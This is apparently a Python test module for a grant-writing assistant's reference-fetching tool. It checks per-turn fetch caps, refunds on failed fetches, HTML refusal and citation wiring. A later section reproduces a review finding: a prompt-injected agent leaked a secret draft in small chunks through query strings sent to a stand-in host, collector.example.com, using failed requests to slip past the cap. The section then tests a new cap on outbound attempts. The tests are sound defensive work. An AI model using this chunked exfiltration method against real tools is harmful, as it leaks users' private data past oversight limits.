"""fetch_reference MCP tool — per-turn cap is the load-bearing piece.
Uses atomic UPDATE turn_jobs SET fetch_count = fetch_count + 1
WHERE workspace_id = ? AND status = 'running' AND fetch_count < 3
RETURNING fetch_count."""

import re
import uuid
from datetime import UTC, datetime

import pytest
from sqlalchemy import select

from grant_lab.config import Settings
from grant_lab.db.models import (
    ChatTurn,
    Reference,
    TurnJob,
    User,
    Workspace,
)
from grant_lab.proposal_assist.port_impl import build_ports
from grant_lab.proposal_assist.ports.accounting import (
    MAX_FETCH_ATTEMPTS_PER_TURN,
    MAX_FETCHES_PER_TURN,
)
from grant_lab.proposal_assist.references.embed import FakeEmbedder
from grant_lab.proposal_assist.tools.references import fetch_reference_impl
from grant_lab.proposal_assist.tools.registry import ToolContext, snapshot_invocation

# Every test reaches the SSRF resolver through fetch_reference_impl;
# apply the shared fake_public_dns fixture from tests/proposal_assist/
# conftest.py to all tests in this module.
pytestmark = pytest.mark.usefixtures("fake_public_dns")

_ARXIV_ATOM_URL = re.compile(r"https://export\.arxiv\.org/api/query.*")
_EMPTY_ATOM_FEED = '<?xml version="1.0"?><feed xmlns="http://www.w3.org/2005/Atom"></feed>'


@pytest.fixture(autouse=True)
def _mock_arxiv_atom(httpx_mock):
    """Register a reusable stub for the arXiv Atom metadata endpoint.

    fetch_arxiv() calls _fetch_arxiv_atom_meta() which GETs
    https://export.arxiv.org/api/query?id_list=<id> for every arXiv
    fetch.  The call is non-fatal (failures are caught + logged), but
    pytest-httpx errors at teardown for any outbound request that has no
    registered mock.  An empty <feed> (no <entry>) makes the metadata
    parse return nothing, keeping these tests focused on
    fetch-count/cap/refund behaviour rather than metadata.
    """
    httpx_mock.add_response(
        url=_ARXIV_ATOM_URL,
        text=_EMPTY_ATOM_FEED,
        is_reusable=True,
        is_optional=True,
    )


def _make_ctx(pg_session_factory, tmp_path, workspace_id, *, active_turn_job_id=None):
    settings = Settings.model_construct(workspaces_dir=str(tmp_path))
    return ToolContext(
        workspace_id=workspace_id,
        repo_dir=tmp_path / str(workspace_id) / "repo",
        session_factory=pg_session_factory,
        settings=settings,
        lifecycle_generation=0,
        active_turn_job_id=active_turn_job_id,
    )


def _seed_running_turn(pg_session_factory):
    """Create a workspace + a running TurnJob (fetch_count starts at 0)."""
    with pg_session_factory() as s:
        owner = User(email=f"o-{uuid.uuid4()}@umu.se")
        s.add(owner)
        s.flush()
        ws = Workspace(owner_id=owner.id, title="T")
        s.add(ws)
        s.flush()
        user_turn = ChatTurn(workspace_id=ws.id, role="user", content="hi")
        s.add(user_turn)
        s.flush()
        job = TurnJob(
            workspace_id=ws.id,
            user_turn_id=user_turn.id,
            status="running",
            started_at=datetime.now(UTC),
            submitted_by_user_id=owner.id,
        )
        s.add(job)
        s.commit()
        return ws.id, job.id


@pytest.mark.asyncio
async def test_fetch_reference_no_running_turn_returns_error(pg_session_factory, tmp_path):
    """The atomic UPDATE returns 0 rows if there's no running turn
    for this workspace (e.g., the tool was invoked from a stale
    handle); we return a clear error."""
    with pg_session_factory() as s:
        owner = User(email=f"o-{uuid.uuid4()}@umu.se")
        s.add(owner)
        s.flush()
        ws = Workspace(owner_id=owner.id, title="T")
        s.add(ws)
        s.commit()
        wsid = ws.id

    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=uuid.uuid4())
    ports = build_ports(pg_session_factory)
    invocation = snapshot_invocation(ctx)
    out = await fetch_reference_impl(ctx, ports=ports, invocation=invocation, input="2401.12345")
    assert "error" in out
    assert "no running turn" in out["error"].lower() or "cap" in out["error"].lower()


@pytest.mark.asyncio
async def test_fetch_reference_increments_fetch_count(pg_session_factory, tmp_path, httpx_mock):
    """Successful fetch increments turn_jobs.fetch_count and inserts
    a Reference row. Injects FakeEmbedder so ingest doesn't try to hit
    Ollama."""
    from io import BytesIO

    from reportlab.pdfgen.canvas import Canvas

    buf = BytesIO()
    c = Canvas(buf)
    c.drawString(72, 720, "arxiv test")
    c.save()
    pdf_bytes = buf.getvalue()

    httpx_mock.add_response(
        url="https://arxiv.org/pdf/2401.12345.pdf",
        content=pdf_bytes,
    )

    wsid, jobid = _seed_running_turn(pg_session_factory)
    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=jobid)
    ports = build_ports(pg_session_factory)
    invocation = snapshot_invocation(ctx)
    out = await fetch_reference_impl(
        ctx, ports=ports, invocation=invocation, input="2401.12345", embedder=FakeEmbedder()
    )
    assert "error" not in out, out
    assert "reference_id" in out

    with pg_session_factory() as s:
        job = s.scalar(select(TurnJob).where(TurnJob.id == jobid))
        ref = s.scalar(select(Reference).where(Reference.workspace_id == wsid))
    assert job.fetch_count == 1
    assert ref is not None
    assert ref.source_type == "arxiv"


@pytest.mark.asyncio
async def test_fetch_reference_4th_attempt_returns_cap_error(
    pg_session_factory, tmp_path, httpx_mock
):
    """3 successful fetches → 4th attempt returns cap error WITHOUT
    incrementing further (atomic WHERE fetch_count < 3). FakeEmbedder
    keeps ingest off the Ollama dependency."""
    from io import BytesIO

    from reportlab.pdfgen.canvas import Canvas

    buf = BytesIO()
    c = Canvas(buf)
    c.drawString(72, 720, "x")
    c.save()
    pdf_bytes = buf.getvalue()

    wsid, jobid = _seed_running_turn(pg_session_factory)
    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=jobid)
    ports = build_ports(pg_session_factory)
    invocation = snapshot_invocation(ctx)
    embedder = FakeEmbedder()

    for i, ax_id in enumerate(["2401.00001", "2401.00002", "2401.00003"]):
        httpx_mock.add_response(
            url=f"https://arxiv.org/pdf/{ax_id}.pdf",
            content=pdf_bytes,
        )
        out = await fetch_reference_impl(
            ctx, ports=ports, invocation=invocation, input=ax_id, embedder=embedder
        )
        assert "error" not in out, (i, out)

    # 4th attempt: cap hit BEFORE any HTTP — no mock registered because
    # the atomic UPDATE returns 0 rows and we short-circuit.
    out = await fetch_reference_impl(
        ctx, ports=ports, invocation=invocation, input="2401.00004", embedder=embedder
    )
    assert "error" in out
    assert "cap" in out["error"].lower() or "3" in out["error"]

    with pg_session_factory() as s:
        job = s.scalar(select(TurnJob).where(TurnJob.id == jobid))
    assert job.fetch_count == 3  # not 4


@pytest.mark.asyncio
async def test_fetch_reference_refunds_count_on_fetch_error(
    pg_session_factory, tmp_path, httpx_mock
):
    """Regression: the per-turn slot is reserved (fetch_count += 1)
    BEFORE the fetch. On a transient FetchError the slot was never spent
    on usable content, so it must be refunded — otherwise a single flaky
    URL permanently shrinks the agent's per-turn budget."""
    # Server returns 500 → fetch_bytes raises FetchError → tool refunds.
    httpx_mock.add_response(
        url="https://arxiv.org/pdf/2401.99999.pdf",
        status_code=500,
    )

    wsid, jobid = _seed_running_turn(pg_session_factory)
    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=jobid)
    ports = build_ports(pg_session_factory)
    invocation = snapshot_invocation(ctx)
    out = await fetch_reference_impl(
        ctx, ports=ports, invocation=invocation, input="2401.99999", embedder=FakeEmbedder()
    )
    assert "error" in out
    assert "fetch failed" in out["error"].lower()
    # The reported count reflects the refund.
    assert out["fetch_count"] == 0

    with pg_session_factory() as s:
        job = s.scalar(select(TurnJob).where(TurnJob.id == jobid))
    # Slot refunded: the failed fetch did not burn the budget.
    assert job.fetch_count == 0


@pytest.mark.asyncio
async def test_fetch_reference_refund_keeps_other_successful_fetches(
    pg_session_factory, tmp_path, httpx_mock
):
    """A refund must only undo the just-consumed slot, not zero out
    earlier successful fetches in the same turn."""
    from io import BytesIO

    from reportlab.pdfgen.canvas import Canvas

    buf = BytesIO()
    c = Canvas(buf)
    c.drawString(72, 720, "ok")
    c.save()
    pdf_bytes = buf.getvalue()

    wsid, jobid = _seed_running_turn(pg_session_factory)
    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=jobid)
    ports = build_ports(pg_session_factory)
    invocation = snapshot_invocation(ctx)
    embedder = FakeEmbedder()

    # One good fetch → count goes to 1.
    httpx_mock.add_response(url="https://arxiv.org/pdf/2401.00010.pdf", content=pdf_bytes)
    out_ok = await fetch_reference_impl(
        ctx, ports=ports, invocation=invocation, input="2401.00010", embedder=embedder
    )
    assert "error" not in out_ok, out_ok

    # One bad fetch → count goes to 2, then refunded back to 1.
    httpx_mock.add_response(url="https://arxiv.org/pdf/2401.00011.pdf", status_code=503)
    out_bad = await fetch_reference_impl(
        ctx, ports=ports, invocation=invocation, input="2401.00011", embedder=embedder
    )
    assert "error" in out_bad
    assert out_bad["fetch_count"] == 1

    with pg_session_factory() as s:
        job = s.scalar(select(TurnJob).where(TurnJob.id == jobid))
    assert job.fetch_count == 1


@pytest.mark.asyncio
async def test_fetch_reference_with_invalid_input_returns_error(pg_session_factory, tmp_path):
    """Unrecognized input → dispatcher raises ValueError → tool returns
    a clear error. fetch_count NOT incremented (defensive: bad input
    shouldn't cost the budget)."""
    wsid, jobid = _seed_running_turn(pg_session_factory)
    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=jobid)
    ports = build_ports(pg_session_factory)
    invocation = snapshot_invocation(ctx)
    out = await fetch_reference_impl(
        ctx, ports=ports, invocation=invocation, input="just some text"
    )
    assert "error" in out

    with pg_session_factory() as s:
        job = s.scalar(select(TurnJob).where(TurnJob.id == jobid))
    assert job.fetch_count == 0


# ---------------------------------------------------------------------------
# Slice 1B Task 7 — source_meta and ctx.citation_service wired through
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_fetch_reference_impl_passes_source_meta_and_citation_service(
    pg_session_factory, tmp_path, httpx_mock, monkeypatch
):
    """fetch_reference_impl must pass source_meta and ctx.citation_service to
    ingest_bytes so Phase 3 wiring is live on the tool path.

    Strategy: monkeypatch ingest_bytes to capture its kwargs; verify that
    source_meta is forwarded (not just source_meta["source"]) and that
    citation_service is ctx.citation_service.
    """
    from io import BytesIO

    from reportlab.pdfgen.canvas import Canvas

    from grant_lab.proposal_assist.references.ingest import IngestResult

    captured: dict = {}

    buf = BytesIO()
    c = Canvas(buf)
    c.drawString(72, 720, "source meta test")
    c.save()
    pdf_bytes = buf.getvalue()

    httpx_mock.add_response(
        url="https://arxiv.org/pdf/2401.77777.pdf",
        content=pdf_bytes,
    )

    wsid, jobid = _seed_running_turn(pg_session_factory)

    class _FakeCitationService:
        def complete_json(self, *, workspace_id, op, system, user):
            pass  # not expected to be called in this test

    fake_service = _FakeCitationService()

    # Build a ToolContext with citation_service set.
    from grant_lab.config import Settings
    from grant_lab.proposal_assist.tools.registry import ToolContext

    settings = Settings.model_construct(workspaces_dir=str(tmp_path))

    # Set citation_service on the context so we can verify fetch_reference_impl
    # forwards it (and source_meta) through to ingest_bytes.
    ctx = ToolContext(
        workspace_id=wsid,
        repo_dir=tmp_path / str(wsid) / "repo",
        session_factory=pg_session_factory,
        settings=settings,
        citation_service=fake_service,
        lifecycle_generation=0,
        active_turn_job_id=jobid,
    )

    # Monkeypatch ingest_bytes at its canonical import path. fetch_reference_impl
    # uses `from grant_lab.proposal_assist.references.ingest import ingest_bytes`
    # inside the function, so we patch the ingest module directly.
    import uuid as _uuid

    import grant_lab.proposal_assist.references.ingest as _ingest_mod

    def _fake_ingest_bytes(**kwargs):
        captured.update(kwargs)
        # Return a minimal IngestResult so the tool's error handling doesn't fire.
        return IngestResult(
            reference_id=_uuid.uuid4(),
            text_status="done",
            text_error=None,
        )

    monkeypatch.setattr(_ingest_mod, "ingest_bytes", _fake_ingest_bytes)

    _ports = build_ports(pg_session_factory)
    _invocation = snapshot_invocation(ctx)
    await fetch_reference_impl(
        ctx, ports=_ports, invocation=_invocation, input="2401.77777", embedder=FakeEmbedder()
    )

    # Key assertions: source_meta and citation_service were forwarded to ingest_bytes.
    assert "source_meta" in captured, "fetch_reference_impl must pass source_meta= to ingest_bytes"
    assert isinstance(captured["source_meta"], dict), (
        "source_meta must be the full dict from dispatch_fetch, not just a string"
    )
    assert "citation_service" in captured, (
        "fetch_reference_impl must pass citation_service= to ingest_bytes"
    )
    assert captured["citation_service"] is fake_service, (
        "citation_service must be ctx.citation_service"
    )


# ---------------------------------------------------------------------------
# M-PA-3 (review 2026-10-26, A5 STEP4) — failed fetches must count against a
# per-turn OUTBOUND ATTEMPT cap, or the cap is not a cap.
# ---------------------------------------------------------------------------

#: The exfiltration collector of the review's probe. A ".example.com" host so
#: tests/proposal_assist/conftest.py::fake_public_dns resolves it to a public IP
#: and the SSRF guard lets it through; pytest-httpx answers it in-process, so
#: nothing ever leaves this machine.
_COLLECTOR_HOST = "collector.example.com"
_COLLECTOR_RE = re.compile(r"https://collector\.example\.com/px\?.*")


def _collector_attempts(httpx_mock):
    """Every outbound request the fetcher actually made to the collector."""
    return [r for r in httpx_mock.get_requests() if r.url.host == _COLLECTOR_HOST]


@pytest.mark.asyncio
async def test_failed_fetches_count_against_the_per_turn_attempt_cap(
    pg_session_factory, tmp_path, httpx_mock
):
    """A5 STEP4: the per-turn cap is refunded on EVERY failure and HTTP 404 is a
    failure, so a prompt-injected agent made 8 outbound GETs — one secret chunk
    per query string — with turn_jobs.fetch_count still at 2. The cap looked
    like it held and the whole draft secret left the box.

    A second, IN-MEMORY per-turn counter must bound outbound ATTEMPTS at
    cap + 2, failures included. The success counter keeps its refund semantics.
    """
    httpx_mock.add_response(url=_COLLECTOR_RE, status_code=404, is_reusable=True, is_optional=True)

    # cap + 2, named in one place so the constant and this test cannot drift.
    assert MAX_FETCH_ATTEMPTS_PER_TURN == MAX_FETCHES_PER_TURN + 2

    secret = "S3CRET-DRAFT-BODY-DO-NOT-LEAK"
    chunks = [secret[i : i + 4] for i in range(0, len(secret), 4)]
    assert len(chunks) == 8, "the probe is 8 calls, one chunk each"

    wsid, jobid = _seed_running_turn(pg_session_factory)
    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=jobid)
    ports = build_ports(pg_session_factory)

    errors = []
    for i, chunk in enumerate(chunks):
        # Production snapshots a FRESH Invocation per tool call (_safe_tool ->
        # snapshot_invocation), so a counter keyed on the Invocation OBJECT
        # would reset mid-turn and reopen the channel. Mirror production.
        invocation = snapshot_invocation(ctx)
        out = await fetch_reference_impl(
            ctx,
            ports=ports,
            invocation=invocation,
            input=f"https://{_COLLECTOR_HOST}/px?s={chunk}",
            embedder=FakeEmbedder(),
        )
        assert "error" in out, (i, out)
        errors.append(out["error"])

    attempts = _collector_attempts(httpx_mock)
    assert len(attempts) == MAX_FETCHES_PER_TURN + 2, [str(r.url) for r in attempts]
    # The refused tail never reached the network, and says why.
    assert "attempt cap" in errors[-1].lower(), errors[-1]
    # The channel is bounded: the secret cannot be reassembled from what left.
    leaked = "".join(r.url.params["s"] for r in attempts)
    assert secret not in leaked
    assert leaked != secret

    with pg_session_factory() as s:
        job = s.scalar(select(TurnJob).where(TurnJob.id == jobid))
    # The existing SUCCESS counter keeps its refund semantics, untouched.
    assert job.fetch_count == 0


@pytest.mark.asyncio
async def test_fetch_attempt_budget_resets_on_the_next_turn(
    pg_session_factory, tmp_path, httpx_mock
):
    """Being per TURN is the whole property. The interactive ToolContext is REUSED
    across turns (set_turn_provenance restamps it), so a counter that survived a
    turn boundary would throttle the next legitimate turn, and one that reset
    mid-turn would reopen the channel. This pins the forward direction: a new
    running turn job gets a fresh attempt budget."""
    httpx_mock.add_response(url=_COLLECTOR_RE, status_code=404, is_reusable=True, is_optional=True)

    wsid, job_a = _seed_running_turn(pg_session_factory)
    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=job_a)
    ports = build_ports(pg_session_factory)

    # Burn the whole attempt budget of turn A, plus one refused call.
    for i in range(MAX_FETCHES_PER_TURN + 3):
        out = await fetch_reference_impl(
            ctx,
            ports=ports,
            invocation=snapshot_invocation(ctx),
            input=f"https://{_COLLECTOR_HOST}/px?s=a{i}",
            embedder=FakeEmbedder(),
        )
        assert "error" in out, (i, out)
    burned = len(_collector_attempts(httpx_mock))
    assert burned == MAX_FETCHES_PER_TURN + 2

    # Turn A finishes; turn B becomes the running turn (uq_turn_jobs_running
    # admits only one). The controller restamps the retained ctx — exactly what
    # set_turn_provenance does between turns.
    with pg_session_factory() as s:
        old = s.scalar(select(TurnJob).where(TurnJob.id == job_a))
        old.status = "completed"
        s.flush()
        turn_b = ChatTurn(workspace_id=wsid, role="user", content="next")
        s.add(turn_b)
        s.flush()
        job = TurnJob(
            workspace_id=wsid,
            user_turn_id=turn_b.id,
            status="running",
            started_at=datetime.now(UTC),
            submitted_by_user_id=old.submitted_by_user_id,
        )
        s.add(job)
        s.commit()
        job_b = job.id
    ctx.active_turn_job_id = job_b

    out = await fetch_reference_impl(
        ctx,
        ports=ports,
        invocation=snapshot_invocation(ctx),
        input=f"https://{_COLLECTOR_HOST}/px?s=b0",
        embedder=FakeEmbedder(),
    )
    assert "error" in out
    assert "attempt cap" not in out["error"].lower(), out["error"]
    # The new turn's first call DID go out: the budget reset at the boundary.
    assert len(_collector_attempts(httpx_mock)) == burned + 1


@pytest.mark.asyncio
async def test_fetch_reference_refuses_html_before_extraction(
    pg_session_factory, tmp_path, httpx_mock
):
    """M-PA-5: an ordinary web page was mis-sniffed as application/pdf, died in
    PDF extraction, and spent a fetch slot on a useless error. It must be
    refused BEFORE extraction, with a message that tells the member what to do,
    and the slot must come back."""
    httpx_mock.add_response(
        url="https://example.com/call-for-proposals",
        text="<!doctype html><html><body><h1>Call for proposals</h1></body></html>",
        headers={"content-type": "text/html; charset=utf-8"},
    )

    wsid, jobid = _seed_running_turn(pg_session_factory)
    ctx = _make_ctx(pg_session_factory, tmp_path, wsid, active_turn_job_id=jobid)
    ports = build_ports(pg_session_factory)
    out = await fetch_reference_impl(
        ctx,
        ports=ports,
        invocation=snapshot_invocation(ctx),
        input="https://example.com/call-for-proposals",
        embedder=FakeEmbedder(),
    )
    assert "error" in out
    assert "HTML pages aren't supported — upload a PDF or give a direct PDF link" in out["error"]
    # Not a PDF-extraction failure: nothing was handed to an extractor.
    assert "extraction failed" not in out["error"].lower()
    assert "No /Root object" not in out["error"]

    with pg_session_factory() as s:
        job = s.scalar(select(TurnJob).where(TurnJob.id == jobid))
        ref = s.scalar(select(Reference).where(Reference.workspace_id == wsid))
    assert job.fetch_count == 0
    assert ref is None
